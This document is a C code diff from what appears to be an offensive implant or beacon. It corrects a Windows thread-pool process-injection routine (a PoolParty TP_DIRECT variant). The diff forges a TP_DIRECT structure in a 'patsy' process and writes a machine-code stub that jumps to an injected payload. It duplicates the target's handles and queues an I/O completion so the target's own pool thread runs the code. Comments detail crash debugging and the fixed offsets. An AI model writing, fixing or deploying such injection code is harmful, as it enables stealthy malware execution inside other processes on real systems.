@@ -592,19 +592,25 @@ BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, int offset, char * parame
 #if defined(_M_X64)
 BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
 	/* SafeBreach "Process Injection Using Windows Thread Pools" variant 7 -
-	 * CLOSED empirically 2026-11-13 (tools/tpd_harness.py, 3/3 exit 0x1337):
 	 * the target pool's IOCP dequeues a completion whose KeyContext is our
-	 * forged TP_DIRECT and TpDirectCallback calls the Callback field, which
+	 * forged TP_DIRECT and the pool worker calls the Callback field, which
 	 * on Win10 19044 x64 sits at +0x38 (0x08/0x10/0x18 fast-fail the pool
 	 * with 0xC0000409, 0x40 lands on the adjacent field -> 0xC0000005).
+	 * C-25 live 2026-11-14: the 2026-11-13 offset-scan harness verdict was
+	 * PARTIAL - {1@0x00, stub@0x38} fires the callback, but the 1 rides
+	 * the TP_TASK header, the dispatch corrupts the pool's accounting
+	 * arrays, and TppWorkerThread AVs at +0x7f7 (notepad patsy, cdb
+	 * capture). The harness passed 3/3 only because exit(0x1337) outran
+	 * the crash. PoolParty-exact fix: all fields zero except Callback.
 	 * No thread-creation primitive is used anywhere - the dequeuing worker
 	 * is the target's own pool thread.
 	 *
 	 * Chain:
 	 *   1. fork&run: resume the suspended patsy and give init a moment -
 	 *      the thread pool does not exist before LdrInitializeThunk lands
-	 *   2. VirtualAllocEx the 0x60-byte TP_DIRECT {RefCount=1,
-	 *      Callback@0x38 = lpStartAddress}
+	 *   2. VirtualAllocEx the 0x60 buffer: TP_DIRECT {all zero except
+	 *      Callback@0x38 = arg-forwarding stub}, payload@0x50/param@0x58
+	 *      stashed beyond the 0x48-byte struct
 	 *   3. walk the target handle table (SystemExtendedHandleInformation),
 	 *      DuplicateHandle every handle into us and NtSetIoCompletion each
 	 *      with our direct pointer as KeyContext. The kernel rejects every
@@ -641,12 +647,21 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 
 	/* 2. TP_DIRECT + arg-forwarding stub. TpDirectCallback invokes
 	 * Callback(direct, ...) - the stage entry would see the direct pointer
-	 * instead of its real argument. Fields +0x40/+0x48 are not touched by
-	 * the dispatch path, so stash payload/param there and point Callback at
-	 * a 13-byte stub: rax=[rcx+0x40]; rcx=[rcx+0x48]; jmp rax. */
+	 * instead of its real argument. The real TP_DIRECT (PoolParty
+	 * ThreadPool.hpp) is 0x48 bytes: TP_TASK{Callbacks@0, NumaNode@8,
+	 * IdealProcessor@0xC, ListEntry@0x10}, Lock@0x20,
+	 * IoCompletionInformationList@0x28, Callback@0x38, then
+	 * NumaNode/IdealProcessor@0x40 - every field except Callback stays
+	 * ZERO (C-25 live: a 1 at +0x00 rides the TP_TASK header, the dispatch
+	 * then corrupts the pool's accounting arrays and TppWorkerThread AVs
+	 * at +0x7f7 before the payload can check in; the old offset-scan
+	 * harness only passed because its exit(0x1337) payload outran the
+	 * crash). Stash payload/param BEYOND the struct at +0x50/+0x58 and
+	 * point Callback at a 10-byte stub: rax=[rcx+0x50]; rcx=[rcx+0x58];
+	 * jmp rax. */
 	unsigned char stubc[] = {
-		0x48, 0x8B, 0x41, 0x40,             /* mov rax, [rcx+0x40] payload  */
-		0x48, 0x8B, 0x49, 0x48,             /* mov rcx, [rcx+0x48] param    */
+		0x48, 0x8B, 0x41, 0x50,             /* mov rax, [rcx+0x50] payload  */
+		0x48, 0x8B, 0x49, 0x58,             /* mov rcx, [rcx+0x58] param    */
 		0xFF, 0xE0                          /* jmp rax                      */
 	};
 	/* alloc RW -> write -> flip RX: the syscall alloc layer does not take
@@ -693,10 +708,11 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 	{
 		unsigned char buf[0x60];
 		memset(buf, 0, sizeof(buf));
-		*(unsigned int *)(buf + 0x00) = 1;                                   /* RefCount */
+		/* PoolParty-exact: everything zero except Callback. The old
+		 * RefCount=1 at +0x00 corrupted the TP_TASK header (see above). */
 		*(unsigned long long *)(buf + 0x38) = (unsigned long long)(size_t)stub;
-		*(unsigned long long *)(buf + 0x40) = (unsigned long long)(size_t)lpStartAddress;
-		*(unsigned long long *)(buf + 0x48) = (unsigned long long)(size_t)lpParameter;
+		*(unsigned long long *)(buf + 0x50) = (unsigned long long)(size_t)lpStartAddress;
+		*(unsigned long long *)(buf + 0x58) = (unsigned long long)(size_t)lpParameter;
 		SIZE_T got = 0;
 		if (!beacon_WriteProcessMemory(hProcess, direct, buf, sizeof(buf), &got) || got != sizeof(buf)) {
 			spawn_log("tpdirect: direct write failed gle=", (long)GetLastError());
